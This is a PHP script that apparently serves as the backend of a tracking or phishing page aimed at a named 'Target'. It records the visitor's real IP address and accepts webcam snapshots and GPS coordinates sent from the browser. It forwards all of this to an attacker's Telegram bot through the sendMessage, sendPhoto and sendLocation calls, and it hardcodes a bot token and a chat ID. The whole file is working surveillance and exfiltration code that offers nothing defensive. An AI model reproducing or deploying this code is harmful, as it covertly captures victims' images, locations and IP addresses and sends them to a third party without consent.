<?php
$token = "8815011899:AAHsSz0h8JqSQqH70l1PgyeqHG3ALwpGBVY";
$chat_id = "6947664268";

$user_id = isset($_GET['id']) ? $_GET['id'] : "ne-nasraw";

$client_ip = "N/A";
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $client_ip = $_SERVER['REMOTE_ADDR'];
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' || (!isset($_POST['image']) && !isset($_POST['lat']))) {
    $ip_text = urlencode("👤 Target Name/ID: $user_id\n🌐 Real IP: $client_ip");
    @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$ip_text");
}

if (isset($_POST['image'])) {
    $img = $_POST['image'];
    $img = str_replace('data:image/png;base64,', '', $img);
    $img = str_replace(' ', '+', $img);
    $data = base64_decode($img);
    $filename = 'cam_' . uniqid() . '.png';
    file_put_contents($filename, $data);

    $url = "https://api.telegram.org/bot$token/sendPhoto";
    $boundary = uniqid();
    $delimiter = '-------------' . $boundary;
    
    $file_path = realpath($filename);
    $file_contents = file_get_contents($file_path);
    
    $post_data = "--" . $delimiter . "\r\n" .
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" .
        $chat_id . "\r\n" .
        "--" . $delimiter . "\r\n" .
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" .
        "📸 Image for Target: $user_id\r\n" .
        "--" . $delimiter . "\r\n" .
        "Content-Disposition: form-data; name=\"photo\"; filename=\"" . $filename . "\"\r\n" .
        "Content-Type: image/png\r\n\r\n" .
        $file_contents . "\r\n" .
        "--" . $delimiter . "--\r\n";

    $context = stream_context_create([
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: multipart/form-data; boundary=" . $delimiter . "\r\n",
            "content" => $post_data
        ]
    ]);
    
    @file_get_contents($url, false, $context);
    @unlink($filename);
}

if (isset($_POST['lat']) && isset($_POST['lon'])) {
    $lat = $_POST['lat'];
    $lon = $_POST['lon'];
    
    $url_loc = "https://api.telegram.org/bot$token/sendLocation?chat_id=$chat_id&latitude=$lat&longitude=$lon";
    @file_get_contents($url_loc);
    
    $loc_text = urlencode("📍 Location for Target: $user_id\nLat: $lat\nLon: $lon");
    $url_msg = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$loc_text";
    @file_get_contents($url_msg);
}
?>
